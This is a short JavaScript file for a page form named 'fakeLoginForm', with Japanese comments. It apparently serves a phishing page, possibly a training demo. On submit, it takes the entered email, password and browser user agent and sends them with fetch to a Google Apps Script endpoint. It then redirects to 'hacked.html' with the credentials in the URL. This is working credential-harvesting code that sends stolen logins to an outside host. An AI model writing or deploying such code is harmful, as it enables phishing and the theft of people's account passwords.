document.getElementById("fakeLoginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let userAgent = navigator.userAgent;

    let params = new URLSearchParams({ email: email, password: password }).toString();

    const gasUrl = "AKfycbz9Psuv1DV7YJA1ynMHABih1-IFnIaVaDuNL2XVUm7-x26W0n4vP-nlj5EnTYrwwWrq";

    // GASにログ情報を送信
    fetch(gasUrl + "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&ua=" + encodeURIComponent(userAgent))
        .then(response => response.text())
        .then(data => console.log("送信成功: ", data))
        .catch(error => console.error("エラー:", error));

    window.location.href = "hacked.html?" + params;
    //window.location.href = "hacked.html";
});
